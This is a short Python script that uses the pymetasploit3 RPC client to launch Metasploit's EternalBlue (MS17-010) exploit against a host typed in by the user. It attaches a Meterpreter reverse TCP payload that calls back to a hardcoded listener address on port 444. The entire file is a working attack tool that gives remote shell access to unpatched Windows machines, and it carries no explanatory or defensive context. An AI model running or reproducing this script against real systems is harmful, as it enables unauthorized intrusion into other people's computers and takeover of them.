from library.pymetasploit3.msfrpc import MsfRpcClient

def init(client,host,lhost='',payload = ''):
    cid = client.consoles.console().cid
    exploit = client.modules.use('exploit','windows/smb/ms17_010_eternalblue')
    exploit['MaxExploitAttempts'] = 2
    exploit['GroomAllocations']= 23
    exploit['RHOSTS'] = host


    pl = client.modules.use('payload','windows/x64/meterpreter/reverse_tcp')
    if lhost is '':
        pl['LHOST'] = '172.168.103.160'
    else:
        pl['LHOST'] = lhost
    pl['LPORT'] = '444'
  
    print("executing Eternalblue on {}".format(host))
    output = (client.consoles.console(cid).run_module_with_output(exploit,payload=pl).split('['))
    x=1
    while x < len(output):
        print("[{}".format(output[x]),end= '')
	    x += 1

if __name__ == '__main__':
    client = MsfRpcClient('123',port=55552)
    host= input("Enter the host address: ")
    init(client,host)
